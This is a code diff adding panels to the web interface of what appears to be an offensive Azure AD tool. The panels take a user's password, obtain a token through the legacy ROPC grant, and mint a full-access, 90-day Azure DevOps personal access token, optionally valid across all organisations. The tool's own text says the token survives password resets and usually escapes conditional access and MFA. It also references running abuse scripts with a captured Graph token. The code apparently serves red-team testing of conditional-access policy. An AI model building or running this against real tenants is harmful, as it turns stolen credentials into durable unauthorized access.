+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Password</label>
+        <input id="adopat-pass-${siteId}" type="password" class="cfg-input" style="flex:1;min-width:240px;font-size:13px" placeholder="paste — never logged" value="${esc(guessPass||'')}">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">Tenant</label>
+        <input id="adopat-tid-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" value="${esc(tid)}" placeholder="organizations, or a tenant GUID/domain">
+        <label style="color:#94a3b8;font-size:13px;margin-left:6px">ADO org</label>
+        <input id="adopat-org-${siteId}" class="cfg-input" style="flex:1;min-width:160px;font-size:13px" placeholder="blank = auto-discover" title="Leave blank to discover the account's org(s) via the vssps accounts API and use the first">
+      </div>
+      <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;margin-bottom:6px">
+        <label style="color:#94a3b8;font-size:13px;min-width:64px">PAT name</label>
+        <input id="adopat-name-${siteId}" class="cfg-input" style="flex:1;min-width:140px;font-size:13px" value="bitm-proxy">
+        <label style="color:#94a3b8;font-size:13px;margin-left:6px">Scope</label>
+        <input id="adopat-scope-${siteId}" class="cfg-input" style="flex:1;min-width:140px;font-size:13px" value="app_token" title="app_token = full access; or a space-delimited list like 'vso.code vso.build'">
+        <label style="color:#94a3b8;font-size:13px;margin-left:6px">Valid days</label>
+        <input id="adopat-days-${siteId}" class="cfg-input" type="number" min="1" max="365" style="width:72px;font-size:13px" value="90">
+        <label style="color:#94a3b8;font-size:13px;margin-left:6px;display:flex;align-items:center;gap:4px" title="allOrgs=true issues a PAT valid against every org the identity can reach"><input type="checkbox" id="adopat-allorgs-${siteId}"> all orgs</label>
+        <button class="btn" style="padding:3px 12px;font-size:13px;background:#7f1d1d;border-color:#991b1b;color:#fecaca" onclick="adoPatRun('${siteId}')">▶ Create</button>
+      </div>
+      <div style="color:#78859b;font-size:11px;margin-bottom:6px">
+        ROPC → Azure DevOps token (${esc('499b84ac')}…) → POST /_apis/tokens/pats. Creates a real, listable PAT plus an Azure AD sign-in log entry.
+        Durable credential — survives password reset, usually outside CA/MFA. Revoke from ADO → User settings → Personal access tokens when done.
+      </div>
+      <div id="adopat-result-${siteId}" style="font-size:13px"></div>
     </div>
   </div>`;
 }
@@ -6768,6 +7290,8 @@ function renderCreds(){
         </div>
         <div id="test-result-${site.id}" style="margin-top:6px;display:none"></div>
         ${renderAaaTokenSnippet(d,site.id)}
+        ${renderRopcPanel(d,site.id)}
+        ${renderAdoPatPanel(d,site.id)}
         <div style="margin-top:10px;padding-top:8px;border-top:1px solid #333">
           <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center">
             <span style="color:#fca5a5;font-size:13px;font-weight:600" title="AbuseAzureAPIPermissions.ps1 — Hagrid29's recon/abuse helpers, invoked via pwsh with the captured Graph token">AAA:</span>
@@ -7327,6 +7851,93 @@ async function aaaLoginRun(siteId){
     // Refresh sitesCache so the new token shows up in the AAA runner's
     // Token dropdown without a manual reload.
     send({cmd:'get_sites'});
+  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
+}
+function ropcToggle(siteId){
+  const p=document.getElementById('ropc-'+siteId);
+  if(!p)return;
+  p.style.display=p.style.display==='none'?'':'none';
+  if(p.style.display!=='none'){
+    document.getElementById('ropc-pass-'+siteId)?.focus();
+  }
+}
+async function ropcRun(siteId){
+  const user=(document.getElementById('ropc-user-'+siteId)?.value||'').trim();
+  const pass=document.getElementById('ropc-pass-'+siteId)?.value||'';
+  const tid=(document.getElementById('ropc-tid-'+siteId)?.value||'').trim()||'organizations';
+  const cid=(document.getElementById('ropc-cid-'+siteId)?.value||'').trim();
+  const out=document.getElementById('ropc-result-'+siteId);
+  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
+  out.innerHTML='<div style="color:#94a3b8">Requesting token (grant_type=password)…</div>';
+  try{
+    const r=await apiFetch('/api/test-ropc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass,tenant_id:tid,client_id:cid})});
+    const d=await r.json();
+    if(d.error&&!d.aadsts_code){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
+    if(!d.ok){
+      // A blocked grant is itself the finding — surface the AADSTS code
+      // prominently rather than treating it as a plain failure.
+      out.innerHTML=`<div style="color:#fbbf24;margin-bottom:4px">✗ ${esc(d.aadsts_code||d.error||'blocked')} — CA policy blocked the ROPC grant (this may be the *expected*/good outcome)</div>
+        <div style="color:#94a3b8;font-size:12px">${esc(d.error_description||'')}</div>`;
+      return;
+    }
+    const tok=d.access_token||'';
+    out.innerHTML=`<div style="color:#f87171;font-weight:600;margin-bottom:4px">⚠ ROPC succeeded — legacy grant was NOT blocked by CA policy</div>
+      <div style="color:#4ade80;margin-bottom:4px">✓ token obtained (${tok.length} bytes, expires in ${d.expires_in||'?'}s)</div>
+      <div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">
+        <code style="color:#cbd5e1;font-size:11px;flex:1;background:#020617;padding:4px 8px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(tok.slice(0,80))}…</code>
+        <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f" data-tok="${esc(tok)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy</button>
+        <button class="btn" style="padding:2px 10px;font-size:12px;background:#065f46" data-tok="${esc(tok)}" onclick="testGraphDirect(this.dataset.tok,this)">Test Graph</button>
+      </div>`;
+  }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
+}
+function adoPatToggle(siteId){
+  const p=document.getElementById('adopat-'+siteId);
+  if(!p)return;
+  p.style.display=p.style.display==='none'?'':'none';
+  if(p.style.display!=='none'){
+    document.getElementById('adopat-pass-'+siteId)?.focus();
+  }
+}
+async function adoPatRun(siteId){
+  const user=(document.getElementById('adopat-user-'+siteId)?.value||'').trim();
+  const pass=document.getElementById('adopat-pass-'+siteId)?.value||'';
+  const tid=(document.getElementById('adopat-tid-'+siteId)?.value||'').trim()||'organizations';
+  const org=(document.getElementById('adopat-org-'+siteId)?.value||'').trim();
+  const name=(document.getElementById('adopat-name-'+siteId)?.value||'').trim()||'bitm-proxy';
+  const scope=(document.getElementById('adopat-scope-'+siteId)?.value||'').trim()||'app_token';
+  const days=parseInt(document.getElementById('adopat-days-'+siteId)?.value||'90',10)||90;
+  const allOrgs=!!document.getElementById('adopat-allorgs-'+siteId)?.checked;
+  const out=document.getElementById('adopat-result-'+siteId);
+  if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
+  out.innerHTML='<div style="color:#94a3b8">ROPC → ADO token → discover org → create PAT…</div>';
+  try{
+    const r=await apiFetch('/api/create-ado-pat',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({username:user,password:pass,tenant_id:tid,organization:org,
+        display_name:name,scope:scope,valid_days:days,all_orgs:allOrgs})});
+    const d=await r.json();
+    if(d.error&&!d.aadsts_code){
+      // Non-ROPC failure (org discovery / PAT creation) — show stage + message.
+      out.innerHTML=`<div style="color:#f87171">✗ ${esc(d.stage||'error')}: ${esc(d.error)}</div>`+
+        (d.organizations&&d.organizations.length?`<div style="color:#94a3b8;font-size:12px">orgs seen: ${esc(d.organizations.join(', '))}</div>`:'');
+      return;
+    }
+    if(!d.ok){
+      // ROPC blocked at the token step — same finding framing as the ROPC panel.
+      out.innerHTML=`<div style="color:#fbbf24;margin-bottom:4px">✗ ${esc(d.aadsts_code||d.error||'blocked')} — CA policy blocked the ROPC grant to Azure DevOps (this may be the *expected*/good outcome)</div>
+        <div style="color:#94a3b8;font-size:12px">${esc(d.error_description||'')}</div>`;
+      return;
+    }
+    const pat=d.pat||'';
+    const orgList=(d.organizations&&d.organizations.length>1)
+      ? `<div style="color:#94a3b8;font-size:12px">other orgs on this account: ${esc(d.organizations.filter(o=>o!==d.organization).join(', '))}</div>`:'';
+    out.innerHTML=`<div style="color:#f87171;font-weight:600;margin-bottom:4px">⚠ ADO PAT minted — durable credential, survives password reset & usually outside CA/MFA</div>
+      <div style="color:#4ade80;margin-bottom:4px">✓ "${esc(d.display_name||name)}" in org <b>${esc(d.organization||'?')}</b> · scope ${esc(d.scope||scope)} · valid to ${esc(d.valid_to||'?')}${d.token_source==='ropc'?' · via ROPC':''}</div>
+      <div style="display:flex;gap:6px;align-items:center;margin-bottom:4px">
+        <code style="color:#cbd5e1;font-size:11px;flex:1;background:#020617;padding:4px 8px;border-radius:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(pat.slice(0,12))}… (${pat.length} chars)</code>
+        <button class="btn" style="padding:2px 10px;font-size:12px;background:#1e3a5f" data-tok="${esc(pat)}" onclick="copyToClipboard(this.dataset.tok,this)">Copy PAT</button>
+      </div>
+      <div style="color:#78859b;font-size:11px">authorizationId ${esc(d.authorization_id||'?')} — revoke from ADO → User settings → Personal access tokens</div>
+      ${orgList}`;
   }catch(e){out.innerHTML='<div style="color:#f87171">Error: '+esc(e.message)+'</div>'}
 }
 
